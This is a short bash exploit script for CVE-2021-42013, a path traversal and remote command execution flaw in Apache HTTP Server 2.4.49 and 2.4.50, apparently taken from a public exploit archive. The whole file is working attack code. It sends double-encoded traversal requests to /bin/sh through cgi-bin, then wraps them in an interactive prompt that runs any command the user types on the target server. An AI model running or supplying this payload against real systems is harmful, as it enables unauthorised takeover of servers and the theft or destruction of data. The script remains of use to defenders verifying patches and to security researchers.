#!/bin/bash

# Exploit: Apache HTTP Server 2.4.49, 2.4.50 - Path Traversal & RCE
# Date: 10/05/2021
# Exploit Author: Eduardo Alves 
# Vendor Homepage:  https://apache.org/
# Version: 2.4.49
# Tested on: 2.4.49
# CVE : CVE-2021-42013

while [ "$host" == "" ];

do            
    echo "Example https://www.google.com"
        read -p "Insert the target: " host   

    if [ "$host" != "" ];then

    while true
    do    
       
        who=`curl -k -s "$host/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh" --data "echo Content-Type: text/plain; echo; whoami"`
        hstn=`curl -k -s "$host/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh" --data "echo Content-Type: text/plain; echo; hostname"`
        read  -p "`printf $who"@"$hstn`:~$ " cmd 
                curl -k -s "$host/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh" --data "echo Content-Type: text/plain; echo; $cmd"
           done
     
    else
        echo "Target is empty !"
    
    fi

done   
